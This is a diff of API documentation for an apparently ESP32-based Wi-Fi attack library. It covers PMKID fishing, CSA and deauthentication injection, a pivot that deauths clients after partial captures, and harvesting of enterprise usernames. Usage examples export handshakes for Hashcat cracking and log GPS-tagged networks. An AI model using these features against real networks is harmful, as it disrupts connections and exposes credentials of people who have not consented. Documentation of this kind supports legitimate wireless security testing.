@@ -116,60 +116,107 @@ The main engine class. Must call `tick()` in your main loop.
 #### Initialization
 
 ```cpp
-void begin(const Config& cfg = Config());
+Error begin(const Config& cfg = Config());
 ```
 
-Initialize the engine with configuration options.
+Initialize the engine. Returns `OK` on success or an `Error` code on failure. Must be called before any other method.
 
 #### Configuration Structure
 
 ```cpp
 struct Config {
-    uint16_t hop_dwell_ms;          // Time spent on each channel (default: 300ms)
-    uint8_t  hop_interval;          // Channels between hops (default: 1)
-    uint8_t  attack_retries;        // Attack attempts per target (default: 3)
-    uint16_t pmkid_timeout_ms;      // PMKID wait time (default: 500ms)
-    bool     capture_half_handshakes; // Save M2-only frames (default: true)
-    uint8_t  capture_filter;        // Packet logging bitmask (default: 0)
+    uint16_t hop_dwell_ms           = 200;   // Time spent on each channel (ms)
+    uint32_t m1_lock_ms             = 800;   // How long to stay on channel after seeing M1
+    uint32_t fish_timeout_ms        = 2000;  // Timeout per PMKID association attempt
+    uint8_t  fish_max_retries       = 2;     // PMKID retries before pivoting to CSA
+    uint32_t csa_wait_ms            = 4000;  // Wait window after CSA/Deauth burst
+    uint8_t  csa_beacon_count       = 8;     // Number of CSA beacons per burst
+    uint8_t  deauth_burst_count     = 16;    // Frames per standalone deauth burst
+    uint8_t  csa_deauth_count       = 15;    // Deauth frames appended after CSA burst
+    uint16_t probe_aggr_interval_s  = 30;    // Seconds between re-attacking the same AP
+    uint32_t session_timeout_ms     = 60000; // How long orphaned M1 sessions live in RAM
+    bool     capture_half_handshakes = false; // Fire callback on M2-only captures and pivot to active attack
+    bool     skip_immune_networks   = true;  // Skip pure WPA3 / PMF-Required networks
+    uint8_t  capture_filter         = LOG_FILTER_HANDSHAKES | LOG_FILTER_PROBES;
 };
 ```
 
 #### Callbacks
 
 ```cpp
-void setEapolCallback(EapolCb callback);        // Handshake capture events
-void setIdentityCallback(IdentityCb callback);  // EAP-Identity events  
-void setApCallback(ApCb callback);              // AP discovery events
-void setTargetFilter(TargetFilterCb filter);    // Network selection filter
-void setPacketLogger(PacketCb logger);          // Raw packet logging
+void setEapolCallback(EapolCb cb);              // Handshake captured (EAPOL or PMKID)
+void setApFoundCallback(ApFoundCb cb);          // New AP discovered
+void setIdentityCallback(IdentityCb cb);        // 802.1X EAP-Identity harvested
+void setAttackResultCallback(AttackResultCb cb);// Attack exhausted without capturing
+void setTargetFilter(TargetFilterCb cb);        // Early filter — return false to ignore AP
+void setPacketLogger(PacketCb cb);              // Raw promiscuous-mode frames
+```
+
+#### State & Stats
+
+```cpp
+bool    isActive()    const;  // True if frame processing is enabled
+bool    isAttacking() const;  // True if a PMKID/CSA attack is in progress
+bool    hasTarget()   const;  // True if focused on a specific BSSID
+uint8_t getChannel()  const;  // Current radio channel
+int8_t  getLastRssi() const;  // RSSI of the last received frame
+Stats&  getStats();           // Reference to frame counters
+void    resetStats();         // Zero all counters
+```
+
+#### Target & Channel Control
+
+```cpp
+Error setTarget(const uint8_t* bssid, uint8_t channel); // Focus on one BSSID
+void  clearTarget();                                     // Resume autonomous operation
+Error setChannel(uint8_t ch);                            // Tune to a specific channel
+Error lockChannel(uint8_t ch);                           // Stop hopping, lock channel
+void  startHopping(uint16_t dwellMs = 0);                // Start channel hopping
+void  stopHopping();                                     // Stop hopping
+void  setChannelList(const uint8_t* channels, uint8_t count); // Restrict hop sequence
+```
+
+#### Captured List
+
+```cpp
+void markCaptured(const uint8_t* bssid);                       // Skip this BSSID forever
+void clearCapturedList();                                       // Reset captured list
+void setIgnoreList(const uint8_t (*bssids)[6], uint8_t count); // Permanent ignore list
 ```
 
 #### Attack Control
 
 ```cpp
-void setAttackMask(uint8_t mask);  // Configure attack modes (bitmask)
-void addIgnoreBssid(const uint8_t* bssid);  // Skip specific networks
+void setAttackMask(uint8_t mask);  // Configure active attack vectors (bitmask)
 ```
 
 #### Attack Mode Constants
 
 ```cpp
-#define ATTACK_PASSIVE      0x00  // Listen only
-#define ATTACK_PMKID        0x01  // PMKID extraction
-#define ATTACK_CSA          0x02  // Channel Switch Announcement
-#define ATTACK_DEAUTH       0x04  // Deauthentication frames
-#define ATTACK_STIMULATE    0x08  // QoS Null Data stimulation
-#define ATTACK_ALL          0xFF  // All attack vectors
+#define ATTACK_PMKID        0x01  // PMKID fishing via fake association
+#define ATTACK_CSA          0x02  // Channel Switch Announcement injection
+#define ATTACK_PASSIVE      0x04  // Listen-only — zero transmission
+#define ATTACK_DEAUTH       0x08  // Classic deauthentication (Reason 7)
+#define ATTACK_STIMULATE    0x10  // QoS Null Data client stimulation
+#define ATTACK_ALL          0x1F  // All attack vectors
+```
+
+#### Capture Type Constants
+
+```cpp
+#define CAP_PMKID       0x01  // PMKID extracted via fake association
+#define CAP_EAPOL       0x02  // Full M1+M2 from passive capture
+#define CAP_EAPOL_CSA   0x03  // Full M1+M2 triggered by CSA/Deauth
+#define CAP_EAPOL_HALF  0x04  // M2-only (no anonce) — active attack pivot fired
 ```
 
 #### Capture Filter Constants
 
 ```cpp
-#define LOG_FILTER_NONE       0x00
-#define LOG_FILTER_HANDSHAKES 0x01
-#define LOG_FILTER_PROBES     0x02
-#define LOG_FILTER_BEACONS    0x04
-#define LOG_FILTER_ALL        0xFF
+#define LOG_FILTER_HANDSHAKES 0x01  // EAPOLs and PMKIDs (SPI-safe)
+#define LOG_FILTER_PROBES     0x02  // Probe requests and responses (SPI-safe)
+#define LOG_FILTER_BEACONS    0x04  // Beacons — high volume, SDMMC only
+#define LOG_FILTER_ALL        0xFF  // Everything — SDMMC only
 ```
 
 ### Data Structures
@@ -178,28 +225,34 @@ void addIgnoreBssid(const uint8_t* bssid);  // Skip specific networks
 
 ```cpp
 struct HandshakeRecord {
-    uint8_t  bssid[6];
-    uint8_t  client[6];
-    char     ssid[33];
-    uint8_t  enc;           // Encryption type
+    uint8_t  type;           // CAP_PMKID / CAP_EAPOL / CAP_EAPOL_CSA / CAP_EAPOL_HALF
     uint8_t  channel;
     int8_t   rssi;
-    uint8_t  eapol_m1[256]; // EAPOL Message 1
-    uint8_t  eapol_m2[256]; // EAPOL Message 2
-    uint16_t m1_len;
-    uint16_t m2_len;
-    bool     is_complete;   // false = M2-only
+    uint8_t  bssid[6];
+    uint8_t  sta[6];         // Client (station) MAC
+    char     ssid[33];
+    uint8_t  ssid_len;
+    uint8_t  enc;            // 0=Open, 1=WEP, 2=WPA, 3=WPA2/WPA3, 4=Enterprise
+    // PMKID path
+    uint8_t  pmkid[16];
+    // EAPOL path
+    uint8_t  anonce[32];
+    uint8_t  mic[16];
+    uint8_t  eapol_m2[256];
+    uint16_t eapol_m2_len;
+    bool     has_mic;
+    bool     has_anonce;
 };
 ```
 
-#### IdentityRecord
+#### EapIdentityRecord
 
 ```cpp
-struct IdentityRecord {
-    uint8_t bssid[6];
-    uint8_t client[6];
-    char    ssid[33];
-    char    identity[128];  // Plaintext username/email
+struct EapIdentityRecord {
+    uint8_t bssid[6];       // Access Point MAC
+    uint8_t client[6];      // Enterprise client MAC
+    char    identity[65];   // Plaintext identity / email
+    uint8_t channel;
     int8_t  rssi;
 };
 ```
@@ -210,18 +263,45 @@ struct IdentityRecord {
 struct ApRecord {
     uint8_t bssid[6];
     char    ssid[33];
-    uint8_t enc;       // 0=Open, 1=WEP, 2=WPA, 3=WPA2, 4=WPA3
+    uint8_t ssid_len;
     uint8_t channel;
     int8_t  rssi;
-    bool    pmf_required;
+    uint8_t enc;       // 0=Open, 1=WEP, 2=WPA, 3=WPA2/WPA3, 4=Enterprise
+};
+```
+
+#### AttackResultRecord
+
+```cpp
+enum AttackResult : uint8_t {
+    RESULT_PMKID_EXHAUSTED = 1,  // All PMKID retries failed
+    RESULT_CSA_EXPIRED     = 2,  // CSA/Deauth window closed, no EAPOL received
+};
+
+struct AttackResultRecord {
+    uint8_t      bssid[6];
+    char         ssid[33];
+    uint8_t      ssid_len;
+    AttackResult result;
 };
 ```
 
 ### Format Utilities
 
 ```cpp
-String toHC22000(const HandshakeRecord& rec);  // Hashcat format
-String toPcapng(const HandshakeRecord& rec);   // PCAPNG format
+// Convert a HandshakeRecord to a Hashcat-compatible HC22000 string
+String toHC22000(const HandshakeRecord& rec);
+
+// Write PCAPNG global header (SHB + IDB) — call once at file start
+size_t writePcapngGlobalHeader(uint8_t* buffer);
+
+// Serialize a HandshakeRecord into PCAPNG Enhanced Packet Blocks
+size_t writePcapngRecord(const HandshakeRecord& rec, uint8_t* buffer, size_t max_len);
+
+// Serialize a raw 802.11 frame into a PCAPNG Enhanced Packet Block
+size_t writePcapngPacket(const uint8_t* payload, size_t len,
+                         int8_t rssi, uint64_t ts_usec,
+                         uint8_t* buffer, size_t max_len);
 ```
 
 ### Storage Utilities (Optional)
@@ -229,22 +309,32 @@ String toPcapng(const HandshakeRecord& rec);   // PCAPNG format
 Requires `#include <PoliticianStorage.h>`.
 
 ```cpp
-// Append handshake to PCAPNG file
-PcapngFileLogger::append(fs::FS& fs, const char* path, 
-                        const HandshakeRecord& rec);
+// Append handshake to PCAPNG file (writes global header automatically)
+PcapngFileLogger::append(fs::FS& fs, const char* path,
+                         const HandshakeRecord& rec);
 
-// Append packet to PCAPNG file  
+// Append raw 802.11 frame to PCAPNG file
 PcapngFileLogger::appendPacket(fs::FS& fs, const char* path,
-                              const uint8_t* payload, uint16_t len,
-                              int8_t rssi, uint32_t timestamp);
+                               const uint8_t* payload, uint16_t len,
+                               int8_t rssi, uint32_t ts_usec);
 
-// Append to Wigle CSV
+// Append handshake details to Wigle CSV
 WigleCsvLogger::append(fs::FS& fs, const char* path,
-                      const ApRecord& ap, float lat, float lon);
+                       const HandshakeRecord& rec, float lat, float lon,
+                       float alt = 0.0, float acc = 10.0);
 
-// Append enterprise identity to CSV
+// Append any discovered AP to Wigle CSV (use with setApFoundCallback)
+WigleCsvLogger::appendAp(fs::FS& fs, const char* path,
+                         const ApRecord& ap, float lat, float lon,
+                         float alt = 0.0, float acc = 10.0);
+
+// Append handshake to HC22000 text file
+Hc22000FileLogger::append(fs::FS& fs, const char* path,
+                           const HandshakeRecord& rec);
+
+// Append harvested enterprise identity to CSV
 EnterpriseCsvLogger::append(fs::FS& fs, const char* path,
-                           const IdentityRecord& rec);
+                            const EapIdentityRecord& rec);
 ```
 
 ## Usage Examples
@@ -287,15 +377,18 @@ engine.setAttackMask(ATTACK_ALL);
 ### Enterprise Credential Harvesting
 
 ```cpp
-void onIdentity(const IdentityRecord &rec) {
-    Serial.printf("[802.1X] %s → %s\n", rec.ssid, rec.identity);
-    // Save to CSV for analysis
+void onIdentity(const EapIdentityRecord &rec) {
+    char bssid[18];
+    snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
+             rec.bssid[0], rec.bssid[1], rec.bssid[2],
+             rec.bssid[3], rec.bssid[4], rec.bssid[5]);
+    Serial.printf("[802.1X] %s → %s\n", bssid, rec.identity);
     EnterpriseCsvLogger::append(SD, "/identities.csv", rec);
 }
 
 void setup() {
     engine.setIdentityCallback(onIdentity);
-    
+
     Config cfg;
     cfg.hop_dwell_ms = 800;  // Longer dwell for EAP exchanges
     engine.begin(cfg);
@@ -346,11 +439,21 @@ Combine with a GPS module for wardriving datasets:
 
 TinyGPSPlus gps;
 
+// Log every discovered AP (use appendAp for ApRecord)
 void onAp(const ApRecord &ap) {
     if (gps.location.isValid()) {
-        WigleCsvLogger::append(SD, "/wardrive.csv", ap, 
-                              gps.location.lat(), 
-                              gps.location.lng());
+        WigleCsvLogger::appendAp(SD, "/wardrive.csv", ap,
+                                 gps.location.lat(),
+                                 gps.location.lng());
+    }
+}
+
+// Log captured handshakes with GPS context (use append for HandshakeRecord)
+void onHandshake(const HandshakeRecord &rec) {
+    if (gps.location.isValid()) {
+        WigleCsvLogger::append(SD, "/wardrive.csv", rec,
+                               gps.location.lat(),
+                               gps.location.lng());
     }
 }
 ```
@@ -359,12 +462,29 @@ void onAp(const ApRecord &ap) {
 
 ### Half-Handshakes and Smart Pivot
 
-When `cfg.capture_half_handshakes = true`, the engine saves M2-only frames (incomplete handshakes). These can still be cracked by modern tools like Hashcat.
+When `cfg.capture_half_handshakes = true`, the engine fires the EAPOL callback with `type = CAP_EAPOL_HALF` on M2-only captures. These records have no `anonce` so they cannot be directly cracked, but they confirm an active client is present.
 
-When an M2-only handshake is captured, the engine automatically executes a **Smart Pivot**:
-1. Marks the network as a "Hot Target" with active clients
-2. Immediately launches CSA/Deauth attacks on the client
-3. Captures the complete 4-way handshake on reconnection
+The engine immediately executes a **Smart Pivot**:
+1. Marks the network as having active clients
+2. Launches CSA/Deauth to force a fresh 4-way handshake
+3. Captures the complete M1+M2 on reconnection
+
+### Attack Result Callbacks
+
+Register `setAttackResultCallback()` to be notified when an attack exhausts all options without capturing anything. Useful for logging failed targets or adjusting strategy at runtime:
+
+```cpp
+engine.setAttackResultCallback([](const AttackResultRecord &res) {
+    char bssid[18];
+    snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
+             res.bssid[0], res.bssid[1], res.bssid[2],
+             res.bssid[3], res.bssid[4], res.bssid[5]);
+    if (res.result == RESULT_PMKID_EXHAUSTED)
+        Serial.printf("[!] PMKID failed: %s (%s)\n", res.ssid, bssid);
+    else if (res.result == RESULT_CSA_EXPIRED)
+        Serial.printf("[!] CSA/Deauth timed out: %s (%s)\n", res.ssid, bssid);
+});
+```
 
 ### Hidden Network Discovery
 
@@ -413,7 +533,7 @@ Then open `docs/html/index.html` in your browser.
 
 ## Performance Considerations
 
-- **Channel Hopping**: Default 300ms dwell time balances discovery speed vs. capture reliability
+- **Channel Hopping**: Default 200ms dwell time balances discovery speed vs. capture reliability
 - **Memory**: Core engine uses ~45KB RAM. Storage helpers are opt-in
 - **CPU**: Non-blocking state machine keeps `loop()` responsive
 - **Half-Handshakes**: Enable for better capture rate on fast-hopping scenarios
